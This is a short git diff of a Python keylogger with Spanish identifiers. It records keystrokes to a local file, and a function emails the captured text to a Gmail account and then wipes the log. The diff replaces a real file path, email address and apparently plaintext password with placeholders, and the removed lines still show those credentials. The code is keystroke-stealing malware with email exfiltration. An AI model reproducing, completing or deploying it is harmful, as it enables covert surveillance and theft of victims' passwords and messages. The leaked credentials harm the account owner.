@@ -3,7 +3,7 @@ from http import server
 import re
 import pyHook, pythoncom, sys, logging, time, datetime
 
-carpeta_destino= 'C:\\Users\\breae\\OneDrive - Universidade da Coruña\\Escritorio\\info\\Cyber\\Keys.txt'
+carpeta_destino= '*/Keys.txt'
 segundos_espera= 7
 timeout= time.time()+ segundos_espera
 
@@ -21,7 +21,7 @@ def Enviar_Email():
         data = data.replace("\n", "")
         data = "Mensaje capturado a las: " + fecha + "\n" + data
         print(data)
-        crearEmail("keylogerprueba1@gmail.com", "@lejandro11", "keylogerprueba1@gmail.com", "Nueva captura" +fecha, data)
+        crearEmail("*@gmail.com", "*", "*@gmail.com", "Nueva captura" +fecha, data)
         f.seek(0)
         f.truncate()
 
